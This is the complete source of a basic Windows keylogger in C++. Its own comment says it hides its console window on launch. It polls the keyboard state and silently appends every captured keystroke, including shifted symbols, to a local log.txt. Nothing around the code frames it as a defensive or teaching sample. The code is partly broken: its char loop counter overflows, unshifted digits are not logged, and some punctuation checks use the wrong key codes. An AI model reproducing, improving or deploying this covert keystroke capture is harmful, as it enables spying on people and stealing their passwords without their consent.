/*this is a key logger with basic functionality which doesn't detect num lock, shift, mute and certain special characters.
It hides the console window automatically when the application is run*/
#define _WIN32_WINNT 0x0500
#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>
#include<wincon.h>

using namespace std;

void check_key()
{
    char c;
    while(1)
    {
        for(c=8;c<=300;c++)
        {
            if(GetAsyncKeyState(c)==-32767)//to check if a key was pressed or not
            {
                fstream f("log.txt",ios::app);

                if(!(GetAsyncKeyState(0x10))) //0x10 is the virtual key code of "shift key" and when shift key is not pressed
                {
                    if((c>=65)&&(c<=90))
                     {
                        c+=32;
                        f<<c;
                     }
                     else if(c==VK_ESCAPE)
                        f<<"<ESCAPE>";
                     else if(c==VK_TAB)
                        f<<"    ";
                     else if(c==VK_CAPITAL)
                        f<<"<CAPSLOCK>";
                     else if(c==VK_CONTROL)
                        f<<"<CONTROL>";
                     else if(c==VK_LWIN)
                        f<<"<WINDOWS KEY>";
                     else if(c==VK_SPACE)
                        f<<" ";
                     else if(c==VK_RETURN)
                        f<<"\n";
                     else if(c==VK_BACK)
                        f<<"<BACKSPACE>";
                     else if(c==VK_UP)
                        f<<"<UP ARROW>";
                     else if(c==VK_LEFT)
                        f<<"<LEFT ARROW>";
                     else if(c==VK_RIGHT)
                        f<<"<RIGHT ARROW>";
                     else if(c==VK_DOWN)
                        f<<"<DOWN ARROW>";
                     else if(c==VK_INSERT)
                        f<<"<INSERT>";
                     else if(c==VK_SNAPSHOT)
                        f<<"<PRINTSCREEN>";
                     else if(c==VK_DELETE)
                        f<<"<DELETE>";
                     else if(c==VK_HOME)
                        f<<"<HOME>";
                     else if(c==VK_END)
                        f<<"<END>";
                     else if(c==VK_PRIOR)
                        f<<"<PAGE UP>";
                     else if(c==VK_NEXT)
                        f<<"<PAGE DOWN>";
                     else if(c==VK_F1)
                        f<<"<F1>";
                     else if(c==VK_F2)
                        f<<"<F2>";
                    else if(c==VK_F3)
                        f<<"<F3>";
                    else if(c==VK_F4)
                        f<<"<F4>";
                    else if(c==VK_F5)
                        f<<"<F5>";
                    else if(c==VK_F6)
                        f<<"<F6>";
                    else if(c==VK_F7)
                        f<<"<F7>";
                    else if(c==VK_F8)
                        f<<"<F8>";
                    else if(c==VK_F9)
                        f<<"<F9>";
                    else if(c==VK_F10)
                        f<<"<F10>";
                    else if(c==VK_F11)
                        f<<"<F11>";
                    else if(c==VK_F12)
                        f<<"<F12>";
                    else if(c==VK_NUMPAD0)
                        f<<"0";
                    else if(c==VK_NUMPAD1)
                        f<<"1";
                    else if(c==VK_NUMPAD2)
                        f<<"2";
                    else if(c==VK_NUMPAD3)
                        f<<"3";
                    else if(c==VK_NUMPAD4)
                        f<<"4";
                    else if(c==VK_NUMPAD5)
                        f<<"5";
                    else if(c==VK_NUMPAD6)
                        f<<"6";
                    else if(c==VK_NUMPAD7)
                        f<<"7";
                    else if(c==VK_NUMPAD8)
                        f<<"8";
                    else if(c==VK_NUMPAD9)
                        f<<"9";
                    else if(c==VK_MENU)
                        f<<"<ALT>";
                    else if(c==VK_DIVIDE)
                        f<<"/";
                    else if(c==VK_MULTIPLY)
                        f<<"*";
                    else if(c==VK_SUBTRACT)
                        f<<"-";
                    else if(c==VK_ADD)
                        f<<"+";
                    else if(c==VK_DECIMAL)
                        f<<".";
                    else if(c==59)
                        f<<";";
                    else if(c==61)
                        f<<"=";
                    else if((GetAsyncKeyState(0x45)))
                        f<<";";
                    else if((GetAsyncKeyState(0x1d)))
                        f<<"=";
                     else if((GetAsyncKeyState(0x53)))
                        f<<",";
                    else if((GetAsyncKeyState(0x1c)))
                        f<<"-";
                    else if((GetAsyncKeyState(0x54)))
                        f<<".";
                    else if((GetAsyncKeyState(0x55)))
                        f<<"/";
                    else if((GetAsyncKeyState(0x11)))
                        f<<"`";
                    else if((GetAsyncKeyState(0x31)))
                        f<<"[";
                    else if((GetAsyncKeyState(0x32)))
                        f<<"]";
                    else if((GetAsyncKeyState(0x33)))
                        f<<"\\";
                    else if((GetAsyncKeyState(0x46)))
                        f<<"\'";
                    f.close();

                }
                else                 //when shift key is pressed
                {
                    if((c>=65)&&(c<=90))
                     {
                        f<<c;
                     }
                     else
                     {
                         switch(c)
                         {
                            case '1':f<<"!";
                                    break;
                            case '2':f<<"@";
                                    break;
                            case '3':f<<"#";
                                    break;
                            case '4':f<<"$";
                                    break;
                            case '5':f<<"%";
                                    break;
                            case '6':f<<"^";
                                    break;
                            case '7':f<<"&";
                                    break;
                            case '8':f<<"*";
                                    break;
                            case '9':f<<"(";
                                    break;
                            case '0':f<<")";
                                    break;
                         }
                     }
                }
            }
        }
    }
}

int main()
{
   ShowWindow(GetConsoleWindow(),SW_HIDE);  //to hide the console window
    check_key();
return 0;
}
